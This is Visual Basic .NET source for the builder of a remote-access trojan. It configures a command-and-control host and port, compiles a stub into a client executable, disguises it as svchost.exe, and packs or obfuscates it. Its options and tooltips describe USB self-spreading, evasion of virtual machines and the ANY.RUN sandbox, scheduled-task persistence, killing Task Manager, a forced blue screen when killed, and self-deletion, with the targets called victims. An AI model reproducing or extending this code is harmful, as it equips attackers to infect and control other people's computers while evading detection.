Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Reflection
Imports System.Threading

Public Class Builder
    Inherits Form
    ' Methods
    Private string_0 As String
    Public Sub New()
        Me.string_0 = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles Me.Load
        If Idr.Checked = True Then
            CheckBox6.Enabled = False
        Else
            CheckBox6.Enabled = True
        End If
        ComboBox1.SelectedItem = "v2.0.50727"
        Me.Icon = My.Resources.icon
        Me.dir.SelectedIndex = 0
        Me.host.Text = Class6.smethod_2("host", Me.host.Text)
        Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
        Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
        Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
        Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
        Me.Y.Text = Class6.smethod_2("Y", Me.Y.Text)
        Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString))
        Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString))
        Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString))
        Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString))
        Me.USB_SP.Checked = Conversions.ToBoolean(Class6.smethod_2("USB_SP", Me.USB_SP.Checked.ToString))
        Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString))
        Me.Anti_CH.Checked = Conversions.ToBoolean(Class6.smethod_2("Anti_CH", Me.Anti_CH.Checked.ToString))
        Me.HIDE_ME.Checked = Conversions.ToBoolean(Class6.smethod_2("HIDE_ME", Me.HIDE_ME.Checked.ToString))
        Me.BOT_KILL.Checked = Conversions.ToBoolean(Class6.smethod_2("BOT_KILL", Me.BOT_KILL.Checked.ToString))
        Me.SLP.Value = Conversions.ToDecimal(Class6.smethod_2("SLP", Conversions.ToString(Me.SLP.Value)))
        Me.Persis.Checked = Conversions.ToBoolean(Class6.smethod_2("Persis", Me.Persis.Checked.ToString))
        Me.TextBox1.Text = Class6.smethod_2("TXT", Me.TextBox1.Text)
        Me.TextBox2.Text = Class6.smethod_2("TXT2", Me.TextBox2.Text)
        Me.CheckBox2.Checked = Conversions.ToBoolean(Class6.smethod_2("CHEK2", Me.CheckBox2.Checked.ToString))
        Me.CheckBox3.Checked = Conversions.ToBoolean(Class6.smethod_2("CHEK3", Me.CheckBox3.Checked.ToString))
        Me.CheckBox4.Checked = Conversions.ToBoolean(Class6.smethod_2("CHEK4", Me.CheckBox4.Checked.ToString))
        Me.CheckBox5.Checked = Conversions.ToBoolean(Class6.smethod_2("CHEK5", Me.CheckBox5.Checked.ToString))
        Me.CheckBox6.Checked = Conversions.ToBoolean(Class6.smethod_2("CHEK6", Me.CheckBox6.Checked.ToString))
        Me.PasteE.Checked = Conversions.ToBoolean(Class6.smethod_2("PASTEENABLE", Me.PasteE.Checked.ToString))
        Me.PB.Text = Class6.smethod_2("PB", Me.PB.Text)




        Me.string_0 = Class6.smethod_2("ico", String.Empty)
        If Not File.Exists(Me.string_0) Then
            Me.string_0 = String.Empty
        End If
        If (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))) Then
            Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
        End If
        Try
            If (Me.string_0 <> String.Empty) Then
                Me.PictureBox1.Image = New Icon(Class6.smethod_2("ico", String.Empty)).ToBitmap
                Me.CheckBox1.Checked = True
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.string_0 = String.Empty
            ProjectData.ClearProjectError()
        End Try
        If (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))) Then
            Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
        End If
        If (Convert.ToDouble(Me.SLP.Value) <> Conversions.ToDouble(Class6.smethod_2("SLP", Conversions.ToString(Me.SLP.Value)))) Then
            Me.SLP.Value = Conversions.ToDecimal(Class6.smethod_2("SLP", Conversions.ToString(Me.SLP.Value)))
        End If
        Try
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.string_0 = String.Empty
            ProjectData.ClearProjectError()
        End Try

        Me.Y.Text = "|Ghost|"
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim dialog As New SaveFileDialog With {
            .OverwritePrompt = False,
            .InitialDirectory = (Application.StartupPath),
              .Filter = "EXE|*.exe",
              .FileName = "New Client.exe"
          }


        If (dialog.ShowDialog = DialogResult.OK) Then

            If File.Exists(dialog.FileName) Then
                File.Delete(dialog.FileName)
            End If
            Dim contents As String = File.ReadAllText((Application.StartupPath & "\Stub\Stub.il"))
            Dim newValue As String = Class6.smethod_4(String.Concat(New String() {Me.VN.Text, Me.Y.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Conversions.ToString(Me.SLP.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString, Me.Idr.Checked.ToString, Me.Isu.Checked.ToString, Me.Isf.Checked.ToString, Me.USB_SP.Checked.ToString, Me.HIDE_ME.Checked.ToString, Me.Anti_CH.Checked.ToString, Me.Persis.Checked.ToString, Me.CheckBox2.Checked.ToString, Me.PasteE.Checked.ToString, Me.PB.Text, Me.CheckBox3.Checked.ToString, Me.CheckBox1.Checked.ToString, Me.CheckBox4.Checked.ToString, Me.CheckBox5.Checked.ToString, Me.CheckBox6.Checked.ToString, Me.TextBox1.Text, Me.TextBox2.Text}))
            Dim box As TextBox = Me.VN
            Dim text As String = box.Text
            box.Text = [text]
            contents = contents.Replace("[VN]", Class6.smethod_14([text])).Replace("[H]", Me.host.Text).Replace("[Y]", Me.Y.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[SLP]", Conversions.ToString(Me.SLP.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString).Replace("[Isu]", Me.Isu.Checked.ToString).Replace("[Isf]", Me.Isf.Checked.ToString).Replace("[USB_SP]", Me.USB_SP.Checked.ToString).Replace("[Persis]", Me.Persis.Checked.ToString).Replace("[HIDE_ME]", Me.HIDE_ME.Checked.ToString).Replace("[klen]", Me.klen.Value.ToString).Replace("[Anti_CH]", Me.Anti_CH.Checked.ToString).Replace("[BOTKILL]", Me.BOT_KILL.Checked.ToString).Replace("[PASTEBIN]", Me.PB.Text).Replace("[PasteE]", Me.PasteE.Checked.ToString).Replace("[Sched]", Me.CheckBox4.Checked.ToString).Replace("[SCHEDNAME]", Me.TextBox2.Text).Replace("[Proc]", Me.TextBox1.Text).Replace("[KProc]", Me.CheckBox3.Checked.ToString).Replace("[TaskMGR]", Me.CheckBox2.Checked.ToString).Replace("[ANYRUN]", Me.CheckBox5.Checked.ToString).Replace("[Bypass]", Me.TextBox3.Text).Replace("[Melty]", Me.CheckBox6.Checked.ToString)
            File.WriteAllText((Interaction.Environ("temp") & "\stub.il"), contents)
            Dim startInfo As New ProcessStartInfo With {
                .FileName = (Interaction.Environ("windir") & "\Microsoft.NET\Framework\" & ComboBox1.SelectedItem & "\ilasm.exe"),
                .CreateNoWindow = True,
                .WindowStyle = ProcessWindowStyle.Hidden,
                .Arguments = String.Concat(New String() {"/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", dialog.FileName, """"})
            }
            Process.Start(startInfo).WaitForExit()
            If ((Not Me.string_0 Is Nothing) AndAlso File.Exists(Me.string_0)) Then
                IconN.InjectIcon(dialog.FileName, Me.string_0)
            End If
            Dim ptr As IntPtr = GClass2.BeginUpdateResource(dialog.FileName, False)
            Dim buffer As Byte() = File.ReadAllBytes((Application.StartupPath & "\Stub\Stub.manifest"))
            GClass2.UpdateResource(ptr, CType(24, IntPtr), CType(1, IntPtr), 0, buffer, buffer.Length)
            GClass2.EndUpdateResource(ptr, False)
            Class6.smethod_3("host", Me.host.Text)
            Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
            Class6.smethod_3("SLP", Conversions.ToString(Me.SLP.Value))
            Class6.smethod_3("exe", Me.exe.Text)
            Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
            Class6.smethod_3("vn", Me.VN.Text)
            Class6.smethod_3("Y", Me.Y.Text)
            Class6.smethod_3("bsod", Me.bsod.Checked.ToString)
            Class6.smethod_3("ico", Me.string_0)
            Class6.smethod_3("Idr", Me.Idr.Checked.ToString)
            Class6.smethod_3("Isu", Me.Isu.Checked.ToString)
            Class6.smethod_3("Isf", Me.Isf.Checked.ToString)
            Class6.smethod_3("USB_SP", Me.USB_SP.Checked.ToString)
            Class6.smethod_3("HIDE_ME", Me.HIDE_ME.Checked.ToString)
            Class6.smethod_3("klen", Me.klen.Value.ToString)
            Class6.smethod_3("Anti_CH", Me.Anti_CH.Checked.ToString)
            Class6.smethod_3("Persis", Me.Persis.Checked.ToString)
            Class6.smethod_3("BOT_KILL", Me.BOT_KILL.Checked.ToString)
            Class6.smethod_3("SLP", Me.SLP.Text)
            Class6.smethod_3("TXT", Me.TextBox1.Text)
            Class6.smethod_3("TXT2", Me.TextBox2.Text)
            Class6.smethod_3("CHEK1", Me.CheckBox1.Checked.ToString)
            Class6.smethod_3("CHEK2", Me.CheckBox2.Checked.ToString)
            Class6.smethod_3("CHEK3", Me.CheckBox3.Checked.ToString)
            Class6.smethod_3("CHEK4", Me.CheckBox4.Checked.ToString)
            Class6.smethod_3("CHEK5", Me.CheckBox5.Checked.ToString)
            Class6.smethod_3("CHEK6", Me.CheckBox6.Checked.ToString)
            Class6.smethod_3("PASTEENABLE", Me.PasteE.Checked.ToString)
            Class6.smethod_3("PB", Me.PB.Text)


            If Me.CKOBF.Checked Then
                Application.DoEvents()
                '  If Not Directory.Exists((Application.StartupPath & "\Tools")) Then
                '     Directory.CreateDirectory((Application.StartupPath & "\Tools"))
                'End If
                '    Threading.Thread.Sleep(50)
                '   If Not File.Exists((Application.StartupPath & "\Tools\dotNET_Reactor.exe")) Then
                Dim dotNET_Reactor As Byte() = My.Resources.DNR
                File.WriteAllBytes((Application.StartupPath & "\dotNET_Reactor.exe"), dotNET_Reactor)
                Interaction.Shell(("cmd.exe /C dotNET_Reactor.exe -file """ & dialog.FileName & """ -admin 0 -shownagscreen 0 -showloadingscreen 0 -targetfile """ & dialog.FileName & """ -antitamp 1 -compression 1 -control_flow_obfuscation 1  -flow_level 9 -nativeexe 0 -necrobit 1 -necrobit_comp 1 -prejit 0 -incremental_obfuscation 1 -obfuscate_public_types 1 -resourceencryption 1 -stringencryption 1 -antistrong 1"), AppWinStyle.Hide, True, -1)
                Threading.Thread.Sleep(100)
                Me.Close()
                Try
                    My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\dotNET_Reactor.exe")
                    My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\reactor.nrcfg")

                Catch ex As Exception

                End Try

            End If


            If Me.CKUpx.Checked Then
                Application.DoEvents()
                '  If Not Directory.Exists((Application.StartupPath & "\Tools")) Then
                '   Directory.CreateDirectory((Application.StartupPath & "\Tools"))
                'End If
                '    Threading.Thread.Sleep(50)
                ' If Not File.Exists((Application.StartupPath & "\Tools\mpress.exe")) Then
                Dim mpress As Byte() = My.Resources.mpress
                File.WriteAllBytes((Application.StartupPath & "\mpress.exe"), mpress)
                Interaction.Shell(("cmd.exe /C mpress.exe -s """ & dialog.FileName & """"), AppWinStyle.Hide, True, -1)
                Threading.Thread.Sleep(100)
                Me.Close()
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\mpress.exe")
            End If

            MessageBox.Show(dialog.FileName, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Me.Close()
        End If






    End Sub



    Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs) Handles Idr.CheckedChanged
        If Not Me.Idr.Checked Then
            If (Me.exe.Text = String.Empty) Then
                Me.exe.Text = "svchost.exe"
            End If
            Me.exe.Enabled = False
            Me.dir.Enabled = False
            CheckBox6.Checked = False
            CheckBox6.Enabled = False


        Else
            CheckBox6.Enabled = True
            Me.exe.Enabled = True
            Me.dir.Enabled = True
        End If
    End Sub

    '########################
    '#  Anti-VM+Obfuscation #
    '#   Spread USB+Mpress  #
    '#  Humoud Al-Juraid    #
    '#      @HumoudMJ       #
    '# Please Donot remove  #
    '#	    my credit       #
    '########################


    Private Sub Anti_CH_CheckedChanged(sender As Object, e As EventArgs) Handles Anti_CH.CheckedChanged
        Dim toolTip1 As New ToolTip()
        toolTip1.SetToolTip(Me.Anti_CH, "Vmware|Virtualbox|Sandboxie|Wireshark|ApateDNS|AndSomeDisassemblersApps")

    End Sub

    Private Sub USB_SP_CheckedChanged(sender As Object, e As EventArgs) Handles USB_SP.CheckedChanged
        Dim toolTip2 As New ToolTip()
        toolTip2.SetToolTip(Me.USB_SP, "It will copy your Clinet.exe on any usb attached to PC")

    End Sub

    Private Sub BOT_KILL_CheckedChanged(sender As Object, e As EventArgs) Handles BOT_KILL.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "It will kill any active malware, this feature will be remain even if pc is restarted to ensure better protection")

    End Sub

    Private Sub CKOBF_CheckedChanged(sender As Object, e As EventArgs) Handles CKOBF.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.CKOBF, "A very simple obfuscation, DON'T use it if you want to use some crypter")

        If CKOBF.Checked = True Then
            CKUpx.Enabled = False
        ElseIf CKOBF.Checked = False Then
            CKUpx.Enabled = True
        End If
    End Sub

    Private Sub CKUpx_CheckedChanged(sender As Object, e As EventArgs) Handles CKUpx.CheckedChanged
        If CKUpx.Checked = True Then
            CKOBF.Enabled = False
        ElseIf CKUpx.Checked = False Then
            CKOBF.Enabled = True
        End If

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles HIDE_ME.CheckedChanged

    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs)
        MsgBox("Botkiller will attempt to remove malware that is on the other system making yours the only one standing.", vbInformation, "Info")
    End Sub

    Private Sub CheckBox1_CheckedChanged_1(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked Then
            If (Me.PictureBox1.Image Is Nothing) Then
                Dim dialog As New OpenFileDialog With {
                    .Filter = "Icon|*.ico",
                    .Title = "Choose Icon",
                    .FileName = String.Empty
                }
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.string_0 = dialog.FileName
                    Me.PictureBox1.Image = Image.FromFile(Me.string_0)
                End If
            End If
        Else
            Me.PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub CheckBox6_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "Will delete self after installing into the selected directory")

    End Sub

    Private Sub bsod_CheckedChanged(sender As Object, e As EventArgs) Handles bsod.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "If the trojan gets admin privileges, it will cause a Blue Screen of Death when killed")

    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox5.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "Bypass the ANY.RUN sandbox by checking for it's username and pc name")

    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "Schedules a task to start your trojan every minute on every login")

    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        Dim toolTip3 As New ToolTip()
        toolTip3.SetToolTip(Me.BOT_KILL, "Kill task manager whenever it is opened, very noticeable and might make victim paranoid")

    End Sub

    Private Sub Persis_CheckedChanged(sender As Object, e As EventArgs) Handles Persis.CheckedChanged

    End Sub
End Class